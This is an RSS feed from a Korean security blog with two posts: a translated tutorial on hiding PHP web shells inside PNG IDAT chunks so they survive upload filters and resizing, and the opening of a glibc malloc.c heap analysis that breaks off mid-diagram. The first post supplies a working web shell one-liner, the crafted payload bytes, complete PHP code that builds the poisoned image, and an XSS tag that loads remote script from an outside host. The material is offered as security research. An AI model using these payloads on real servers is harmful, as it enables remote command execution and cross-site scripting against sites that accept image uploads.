<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Defenit 블로그</title>
    <link>https://defenit.kr/</link>
    <atom:link href="/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description></description>
    <pubDate>Thu, 03 Oct 2019 09:34:28 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>[번역] Encoding-Web-Shells-in-PNG-IDAT-chunks</title>
      <link>https://defenit.kr/2019/10/03/Web/%E3%84%B4%20Research/Encoding-Web-Shells-in-PNG-IDAT-chunks/</link>
      <guid>https://defenit.kr/2019/10/03/Web/%E3%84%B4%20Research/Encoding-Web-Shells-in-PNG-IDAT-chunks/</guid>
      <pubDate>Thu, 03 Oct 2019 08:52:51 GMT</pubDate>
      <description>
      
        
        
          &lt;h1 id=&quot;Encoding-Web-Shells-in-PNG-IDAT-chunks&quot;&gt;&lt;a href=&quot;#Encoding-Web-Shells-in-PNG-IDAT-chunks&quot; class=&quot;headerlink&quot; title=&quot;Encoding Web She
        
      
      </description>
      
      <content:encoded><![CDATA[<h1 id="Encoding-Web-Shells-in-PNG-IDAT-chunks"><a href="#Encoding-Web-Shells-in-PNG-IDAT-chunks" class="headerlink" title="Encoding Web Shells in PNG IDAT chunks"></a>Encoding Web Shells in PNG IDAT chunks</h1><p>아래는 PNG 파일 포맷을 이용하여 웹쉘을 삽입하는 내용에 대한 글이다.</p><p>외국문서인 만큼 영어로 되어있길래 잘 이해가 되지 않아 번역을 하며 자세히 알아보았다.</p><p>국내의 보안인들에게 도움이 되었으면 한다.<br>(오역이 있을 수 있습니다.)</p><p>출처 : <a href="https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/" target="_blank" rel="noopener">https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</a></p><hr><p>만약 너가 이미지 안에 웹쉘을 신중하게 넣는다면, 너는 서버 측 필터를 우회할 수 있고 쉘을 구체화할 수 있을 것이다(그리고 나는 주석이나 metadata에 인코딩된 데이터를 넣는것에 대해 말하는 것이 아니다) - 해당 포스트는 당신에게 오직 <a href="https://www.php.net/manual/en/book.image.php/" target="_blank" rel="noopener">GD</a>만을 이용하여 PNG IDAT chunks 에 PHP 쉘을 작성할 수 있다는 것을 보여줄 것이다.</p><p>만약 너가 파일 시스템에 코드를 작성할 수 없다면 <a href="https://nealpoole.com/blog/2011/04/setting-up-php-fastcgi-and-nginx-dont-trust-the-tutorials-check-your-configuration/" target="_blank" rel="noopener">서버의 미흡한 설정</a> 혹은 Local File Inclusion을 exploit 하는 것은 곤란할 수 있다. - 이미지 업로드를 허용하는 과거의 어플리케이션은 metadate나 변조된 이미지를 통해 코드를 서버에 업로드하는 제한된 방법을 제공했다. 그러나 꽤 종종 이미지들은 크기가 조정되거나 회전되거나 메타 데이터가 제거되거나 다른 파일 형식으로 인코딩되어 웹쉘 페이로드가 효과적으로 제거된다.<br><br><br></p><h3 id="PNG-파일-형식-기초"><a href="#PNG-파일-형식-기초" class="headerlink" title="PNG 파일 형식 기초"></a>PNG 파일 형식 기초</h3><p>PNG 파일 포맷(우리는 인덱싱된 것이 아니라 true-color PNG 파일에 초점을 둘 것이다)에서 IDAT chunk는 픽셀 정보를 저장한다. 우리가 PHP 쉘을 저장할 곳은 이 chunk이다. 이제 우리는 픽셀이 항상 RGB color 채널을 나타내는 3 byte로 저장된다고 가정하자.</p><p>raw 이미지가 PNG로 저장이 될 때, 이미지의 각 행은 각 바이트 단위로 <a href="http://www.libpng.org/pub/png/spec/1.2/PNG-Filters.html" target="_blank" rel="noopener">필터링되고</a> 행은 사용된 필터 유형을 나타내는 번호(0x01 ~ 0x05)가 접두사로 붙으며, 다른 행은 다른 필터를 사용할 수 있다. 이렇게 하는 이유는 <a href="http://www.w3.org/TR/PNG-Rationale.html" target="_blank" rel="noopener">압축 비율을 향상</a>시키기 위함이다. 모든 행이 필터링되면 그것들은 IDAT chunk를 형성하기 위해 모두 DEFLATE 알고리즘으로 압축된다.</p><p><img src="https://www.idontplaydarts.com/images/flow1.png" alt="flow1"></p><p>그래서 만약 우리가 데이터를 raw 이미지로 입력하고 쉘로 저장하려면 우리는 PNG 라인 필터와 DEFLATE 알고리즘을 둘다 무산시킬 필요가 있다. 거꾸로 작업하는 것이 더 쉬우므로 우리는 DELFATE 부터 시작할 것이다.<br><br><br></p><h3 id="Step-1-쉘을-형성하기-위해-문자열-압축하기"><a href="#Step-1-쉘을-형성하기-위해-문자열-압축하기" class="headerlink" title="Step 1. 쉘을 형성하기 위해 문자열 압축하기"></a>Step 1. 쉘을 형성하기 위해 문자열 압축하기</h3><p>쉘을 형성하기 위해서는 압축하는 문자열을 설계하는 것이 이상적이다. 이는 생각하는 것만큼 어렵지는 않지만 분명히 문자열에는 반복되는 코드 블록이 포함될 수 없다(또는 압축될 것이다). 사실, 쉘이 압축되는 것으로부터 막기 위해서는 길이가 2글자 이상 반복되는 부분 문자열이 없도록 설계해야 한다. 이것은 우리가 문자열을 짧게 유지해야한다는 것을 의미한다 :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=`$_GET[<span class="number">0</span>]`;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>이렇게 간단하다면 얼마나 좋을까 :) 안타깝게도, 만약 너가 위의 문자열을 DEFLATE로 실행하면 많은 쓰레기가 나오게 되는데, 그 문자열은 압축되지 않았지만 DEFLATE 결과는 byte boundary에서 시작하지 않고 MSB가 아닌 LSB를 사용하여 인코딩된다. 자세히 말하지는 않겠지만 당신은 <a href="https://pograph.wordpress.com/2009/06/04/notes-on-gzip-and-deflate-format/" target="_blank" rel="noopener">Pograph의 weblog</a>에서 더 많은 것을 읽을 수 있다.</p><p>인코딩하기 가장 쉬운 쉘은 상위 케이스에 있다 :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=$_GET[<span class="number">0</span>]($_POST[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>당신은 $_GET[0]을 <code>shell_exec</code>로 지정하고 $_POST[1] 파라미터에 실행하기 위한 쉘 명령어를 전달함으로써 사용할 수 있다.</p><p>나는 위의 문장을 DEFLATES 포맷으로 문자열을 설계했으며, 이 문자열의 이점은 페이로드의 첫번째 바이트가 0x00에서 0x04까지 변경될 수 있고 압축된 문자열도 여전히 읽을 수 있다는 것이다. - 이것은 다음 단계에서 마주할 PNG 필터를 회피하는데 중요하다.</p><p><span style="color:green">03</span>a39f67546f2c24152b116712546f112e29152b2167226b6f5f5310</p><p>안타깝게도 PNG 라이브러리가 이미지 행을 먼저 필터링하고 DEFLATE를 적용하기 때문에 이것을 초기 원시 이미지에 포함시키고 IDAT chunk에 포함시킬 수는 없다.<br><br><br></p><h3 id="Step-2-PNG-라인-필터-우회"><a href="#Step-2-PNG-라인-필터-우회" class="headerlink" title="Step 2. PNG 라인 필터 우회"></a>Step 2. PNG 라인 필터 우회</h3><p><a href="http://www.libpng.org/pub/png/spec/1.2/PNG-Filters.html" target="_blank" rel="noopener">5가지 종류의 필터</a>가 있으며 PNG encoder가 각 라인에 사용할 필터를 결정한다. 이제 문제는 필터로 전달될 때 1단계의 문자열이 생성되는 문자열을 구성해야 한다는 것이다. </p><p>이미지에 오직 1행의 payload만 포함되어있는 한 (이미지의 나머지 부분ì 검은 색과 같이 일정한 색상이어야 함) 당신이 마주치는 두 필터는 1과 3일 것이며, 만약 이미지의 왼쪽 상단에 페이로드가 남아있는 경우 그것을 더욱 단순화하기 위해 우리는 다음과 같이 두 필터의 역순을 쓸 수 있다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Reverse Filter 1</span></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $s; $i++)</span><br><span class="line">   $p[$i+<span class="number">3</span>] = ($p[$i+<span class="number">3</span>] + $p[$i]) % <span class="number">256</span>;</span><br><span class="line"><span class="comment">// Reverse Filter 3 </span></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $s; $i++)</span><br><span class="line">   $p[$i+<span class="number">3</span>] = ($p[$i+<span class="number">3</span>] + floor($p[$i] / <span class="number">2</span>)) % <span class="number">256</span>;</span><br></pre></td></tr></table></figure><p>만약 필터 3만 사용하여 payload를 인코딩하면 PNG 인코더는 필터 1을 사용하려 인코딩하려할 것이고, 필터 1을 사용하여 인코딩하려하면 PNG 인코더는 필터0을 사용하려 할 것이다 - 결국 당신은 루프에 빠지게 된다.</p><p>PNG 인코더가 선택하는 필터를 컨트롤하기 위해 필터 3과 필터 1의 역으로 2단계에서 쉘을 인코딩하고 이를 연결하여 인코더가 payload에 대해 필터 3을 선택하도록 하며 원시 이미지의 데이터가 2단계에서 코드로 변환되도록 한다. 이 코드는 IDAT chunk에 저장된 웹 쉘로 압축된다.</p><p>이 방법을 사용하면 아래의 payload가 생성된다. - 필터 3은 녹색, 필터 1은 회색이다.<br>아러니하게 필터를 사용하면 실제로 페이로드가 더 커진다.</p><p><span style="color:green">0xa3, 0x9f, 0x67, 0xf7, 0xe, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x1, 0xdc, 0x5a, 0x1, 0xdc</span>, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33<br><br><br></p><h3 id="Step-3-Raw-Image-구성하기"><a href="#Step-3-Raw-Image-구성하기" class="headerlink" title="Step 3. Raw Image 구성하기"></a>Step 3. Raw Image 구성하기</h3><p>GD가 PNG 파일로 인코딩할 raw image를 구성할 때 이미지의 첫번째 행에 payload를 배치하는 것은 중요하다. 이 시점에서 위에서 제공한 페이로드는 작은 이미지(최대 ~40px by ~ 40px) 에서만 작동하지만 더 큰 이미지에 대해서도 payload를 구성할 수 있다.</p><p>페이로드는 다음과 같이 RGB byte 시퀀스로 인코딩되어야 한다:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$p = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">        <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">        <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">        <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">        <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">        <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">        <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">        <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line">$img = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($y = <span class="number">0</span>; $y &lt; sizeof($p); $y += <span class="number">3</span>) &#123;</span><br><span class="line">  $r = $p[$y];</span><br><span class="line">  $g = $p[$y+<span class="number">1</span>];</span><br><span class="line">  $b = $p[$y+<span class="number">2</span>];</span><br><span class="line">  $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">  imagesetpixel($img, round($y / <span class="number">3</span>), <span class="number">0</span>, $color);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng($img);</span><br></pre></td></tr></table></figure><p>이미지가 구성되면 검은 배경의 왼쪽 상단 모서리에 픽셀 문자열이 나타난다.</p><p><img src="https://www.idontplaydarts.com/images/shellcode1.png" alt="shellcod1"></p><p>이미지를 hex editor로 볼 때 쉘을 볼 수 있어야 한다:</p><p><img src="https://www.idontplaydarts.com/images/hexdumppngshell.png" alt="hexdumppngshell.png"><br><br><br></p><h3 id="Step-4-이미지-변환-우회"><a href="#Step-4-이미지-변환-우회" class="headerlink" title="Step 4. 이미지 변환 우회"></a>Step 4. 이미지 변환 우회</h3><p>IDAT chunk 에 웹쉘을 넣는 주된 이유는 리사이즈와 리샘플링 작업을 우회할 수 있기 때문이다. - PHP-GD는 이 <a href="https://www.php.net/manual/en/function.imagecopyresized.php" target="_blank" rel="noopener">imagecopyresized</a>와 <a href="https://www.php.net/manual/en/function.imagecopyresampled.php" target="_blank" rel="noopener">imagecopyresampled</a>를 수행하는 두 함수를 포함하고 있다.</p><p>Imagecopyresampled는 픽셀 그룹에서 평균 픽셀 값을 가져와 이미지를 변환하는데 이것을 우회하기 위해서는 payload를 일련의 직사각형 혹은 정사각형으로 인코딩해야 한다. 반면에 Imagecopyresized는 몇 픽셀마다 샘플링하여 이미지를 변환하므로 이 기능을 우회하기 위해서는 실제로 몇 픽셀만 변경하면 된다.</p><p><img src="https://www.idontplaydarts.com/images/resized-256x256.png" alien="left"><br>위에 있는 이미지는 imagecopyresize를 사용하여 32x32로 리사이즈할 때와 아래에 있는 이미지를 imagecopyresample을 사용하여 32x32로 리샘플링할 때 둘 다 웹쉘을 나타낸다.<br><img src="https://www.idontplaydarts.com/images/resampled-256x256.png" alien="right"><br><br><br></p><h3 id="몇-가지-결론"><a href="#몇-가지-결론" class="headerlink" title="몇 가지 결론"></a>몇 가지 결론</h3><p>IDAT chunk에 쉘을 배치하는 것은 몇 가지 큰 이점이 있으며 어플리케이션이 업로드된 이미지를 resize 혹은 re-encode 하는 대부분의 데이터 유효성 검사 기술을 우회해야 한다. 최종이미지가 PNG로 저장되는 한 당신은 위의 페이로드를 GIF나 JPEG로도 업로드할 수 있다.</p><p>쉘을 더욱 효과적으로 숨기고 업로드된 이미지에서 쉘을 찾는데 더 짧도록 사용할 수 있는 더 나은 기법이 있을 수 있으며, 아마도 그것을 막아야 하는 개발자로서 할 수 있는 것은 많지 않을 것이다.</p><p>JPEG와 같이 손실이 많은 형식으로 쉘을 인코딩하는 것은 상당히 어려울 수 있다 - 그러나 불가능하지는 않을 것이다.</p><hr><h3 id="업데이트-2015년-7월"><a href="#업데이트-2015년-7월" class="headerlink" title="업데이트 : 2015년 7월"></a>업데이트 : 2015년 7월</h3><p>만약 사용자가 제공하는 PNG 파일을 포함하는 http 응답의 content-type 필드를 제어할 수 있다면 다음의 payload가 유용할 수 있다. 다음의 스크립트 태그를 IDAT chunk로 인코딩한다 :</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ScRiPT</span> <span class="attr">sRC</span>=<span class="string">//XQI.CC</span>&gt;</span><span class="tag">&lt;/<span class="name">SCrIpt</span>&gt;</span></span><br></pre></td></tr></table></figure><p>참조하는 스크립트는 custom payload를 삽입할 수 있는 GET 파라미터 zz의 내용을 실행한다. 그것은 당신의 target origin에 효과적으로 reflected XSS 엔드 포인트를 제공한다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.org/images/test.png?zz=alert(&quot;this is xss :(&quot;);</span><br></pre></td></tr></table></figure><p><br><br></p><h3 id="Related-work"><a href="#Related-work" class="headerlink" title="Related work"></a>Related work</h3><p>GD 라이브러리 함수를 우회하는 이미지에서 쉘을 인코딩하는데에 대한 다른 훌륭한 작업이 있었다.</p><ul><li><p>“&lt;?=System($_GET[C]);?&gt;”를 <a href="https://rdot.org/forum/showthread.php?t=2780" target="_blank" rel="noopener">imagecreatefromjpeg에서 살아남은 JPEG파일</a>로 인코딩하는데 성공한 이미지 (오류가 발생하지만 GD로 복구됨)</p></li><li><p>인코딩 전략이 약간 다른 <a href="https://github.com/fakhrizulkifli/Defeating-PHP-GD-imagecreatefromgif" target="_blank" rel="noopener">GIF</a>; payload는 이미지 본문이 아닌 GIF 헤더에 인코딩된다.</p></li></ul><p>PNG 다운로드 <a href="https://www.idontplaydarts.com/images/xsspng.png" target="_blank" rel="noopener">XSS Payload</a> | <a href="https://www.idontplaydarts.com/images/phppng.png" target="_blank" rel="noopener">PHP Payload</a></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content:encoded>
      
      <comments>https://defenit.kr/2019/10/03/Web/%E3%84%B4%20Research/Encoding-Web-Shells-in-PNG-IDAT-chunks/#disqus_thread</comments>
    </item>
    
    <item>
      <title>malloc.c Analysis</title>
      <link>https://defenit.kr/2019/09/30/Pwn/%E3%84%B4%20Research/malloc/</link>
      <guid>https://defenit.kr/2019/09/30/Pwn/%E3%84%B4%20Research/malloc/</guid>
      <pubDate>Mon, 30 Sep 2019 14:17:48 GMT</pubDate>
      <description>
      
        
        
          &lt;!--
&gt; 이 글은 glibc 2.23 버전의 malloc.c 소스 코드를 분석하여 Heap 메모리의 관리와 malloc(), free() 의 동작 원리를 보고 어떤 방식으로 Exploit 할 수 있을지, mitigation이나 exploit 방법 
        
      
      </description>
      
      <content:encoded><![CDATA[<!--> 이 글은 glibc 2.23 버전의 malloc.c 소스 코드를 분석하여 Heap 메모리의 관리와 malloc(), free() 의 동작 원리를 보고 어떤 방식으로 Exploit 할 수 있을지, mitigation이나 exploit 방법 등을 연구하는 문서입니다.--><blockquote><p>본 문서에서 분석하는 malloc.c(glibc2.23) 소스 코드는 <a href="https://ftp.gnu.org/gnu/glibc/glibc-2.23.tar.gz" target="_blank" rel="noopener">여기</a>에서 다운로드 받을 수 있습니다.</p></blockquote><hr><h1 id="목차"><a href="#목차" class="headerlink" title="목차"></a>목차</h1><p><a href="#1-whats-heap">1. What’s Heap?</a></p><p><a href="#2-the-heap-chunk">2. The Heap Chunk</a></p><p><a href="#3-management-of-chunk--bin">3. Management of Chunk &amp; Bin</a></p><p><a href="#4-core-functions">4. Core Functions</a></p><p><a href="#5-error-checks">5. Error Checks</a></p><hr><h1 id="1-What’s-Heap"><a href="#1-What’s-Heap" class="headerlink" title="1. What’s Heap?"></a>1. What’s Heap?</h1><p>간략하게 설명하면, 프로그래머가 가변적으로 사용 가능한 메모리 영역이다.<br>이는 프로그래머가 유저 입력(또는 외부 입력)에 따라 유연하게 메모리를 사용할 수 있도록 도와준다.</p><p>아래와 같이 <code>#include &lt;stdlib.h&gt;</code>를 선언함으로써 <code>malloc()</code>과 <code>free()</code>함수로 동적 메모리를 사용할 수 있게 된다.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span>* ptr = <span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc(32): [%p]\n"</span>, ptr);</span><br><span class="line">    <span class="built_in">strcpy</span>(ptr, <span class="string">"ABCD"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"value: [%s]\n"</span>, ptr);</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"free(ptr) success!\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>glibc에서는 아래와 같이 <code>malloc()</code>과 <code>free()</code> 함수를 설명한다.</p><!--malloc(size_t n)최소 n바이트의 새로 할당된 청크의 포인터를 반환한다.만약 사용 가능한 공간이 없을 경우, null을 반환한다.추가적으로, 할당에 실패했을 시 errno는 ANSI C system에서 ENOMEM으로 설정된다.만약 n이 0이라면, malloc은 최소 크기의 청크를 반환한다.(최소 크기는 32비트 시스템에서 16바이트이며, 64비트 시스템에서 24 혹은 32바이트이다.)대부분의 시스템에서 size_t는 unsigned type이므로, 음수 값을 인자로 주면엄청나게 큰 크기의 요청으로 간주된다.할당 가능한 최대 크기는 각 시스템마다 다르지만, size_t의 최대 표현 가능 값보다작다.free(void* p)이전에 malloc 또는 realloc같은 관련 루틴으로 할당된,p가 가르키는 청크를 해제한다.이전에 moloc 또는 recalloc과 같은 관련 루틴을 사용하여 할당되었던 p로 가리킨 메모리 덩어리를 해제한다. p가 null이면 아무 효과도 없다. p가 이미 해방되었다면 임의(즉, 나쁜!) 효과를 가질 수 있다.mallopt를 사용하지 않는 한(mallopt 사용) 매우 큰 공간을 확보하면 시스템에 사용되지 않는 메모리를 되돌려주는 작동이 자동으로 트리거되어 프로그램 설치 공간이 감소한다.--><p><strong>malloc.c:525</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  malloc(size_t n)</span></span><br><span class="line"><span class="comment">  Returns a pointer to a newly allocated chunk of at least n bytes, or null</span></span><br><span class="line"><span class="comment">  if no space is available. Additionally, on failure, errno is</span></span><br><span class="line"><span class="comment">  set to ENOMEM on ANSI C systems.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  If n is zero, malloc returns a minumum-sized chunk. (The minimum</span></span><br><span class="line"><span class="comment">  size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit</span></span><br><span class="line"><span class="comment">  systems.)  On most systems, size_t is an unsigned type, so calls</span></span><br><span class="line"><span class="comment">  with negative arguments are interpreted as requests for huge amounts</span></span><br><span class="line"><span class="comment">  of space, which will often fail. The maximum supported value of n</span></span><br><span class="line"><span class="comment">  differs across systems, but is in all cases less than the maximum</span></span><br><span class="line"><span class="comment">  representable value of a size_t.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">void</span>*  __libc_malloc(<span class="keyword">size_t</span>);</span><br><span class="line">libc_hidden_proto (__libc_malloc)</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  free(void* p)</span></span><br><span class="line"><span class="comment">  Releases the chunk of memory pointed to by p, that had been previously</span></span><br><span class="line"><span class="comment">  allocated using malloc or a related routine such as realloc.</span></span><br><span class="line"><span class="comment">  It has no effect if p is null. It can have arbitrary (i.e., bad!)</span></span><br><span class="line"><span class="comment">  effects if p has already been freed.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Unless disabled (using mallopt), freeing very large spaces will</span></span><br><span class="line"><span class="comment">  when possible, automatically trigger operations that give</span></span><br><span class="line"><span class="comment">  back unused memory to the system, thus reducing program footprint.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">void</span>     __libc_free(<span class="keyword">void</span>*);</span><br><span class="line">libc_hidden_proto (__libc_free)</span><br></pre></td></tr></table></figure></p><p><code>malloc()</code>과 <code>free()</code> 함수는 개발자와 OS 사이에 효율적인 heap memory 관리를 가능하게 해주지만, 개발자가 할당한 메모리의 사용이 끝나면 정확하게 <code>free()</code> 함수를 통해 메모리를 해제해 줘야 하고, 해제한 메모리의 포인터는 즉각 폐기해야 한다. 이는 추후에 설명할 Use After Free 취약점과 관련이 있다.</p><hr><h1 id="2-The-Heap-Chunk"><a href="#2-The-Heap-Chunk" class="headerlink" title="2. The Heap Chunk"></a>2. The Heap Chunk</h1><p>청크는 Heap 메모리 관리를 위한 Heap 메모리 영역의 단위이다.<br>Heap 청크의 구조체는 아래와 같이 정의되어 있다.</p><p><strong>malloc.c:1105</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a "view" into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p><strong>실제 할당된 청크</strong>의 레이아웃은 AsciiFlow로 아래와 같이 나타낼 수 있다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Size of previous chunk, <span class="keyword">if</span> allocated            | |</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Size of chunk, in bytes                       |M|P|</span><br><span class="line">      mem-&gt; 